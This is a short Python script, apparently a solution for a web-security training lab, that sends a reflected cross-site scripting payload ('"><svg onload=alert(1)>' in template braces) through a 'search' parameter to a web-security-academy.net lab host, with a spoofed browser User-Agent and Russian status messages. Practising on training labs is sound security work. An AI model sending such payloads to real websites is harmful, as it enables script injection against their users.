import requests

def send_exploit(url, payload):
  
    exploit_url = f"{url}?search={payload}"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    }

    try:
        response = requests.get(exploit_url, headers=headers)
        if response.status_code == 200:
            print("[+] Эксплойт отправлен успешно!")
            print(f"URL с полезной нагрузкой: {exploit_url}")
        else:
            print(f"[-] Ошибка: сервер вернул статус-код {response.status_code}")
    
    except requests.RequestException as e:
        print(f"[-] Ошибка при выполнении запроса: {e}")

if __name__ == "__main__":
    target_url = "https://0aa300000373fbed81bf84bd008c00fb.web-security-academy.net/"
    xss_payload = "{{ \"><svg onload=alert(1)> }}"
    send_exploit(target_url, xss_payload)
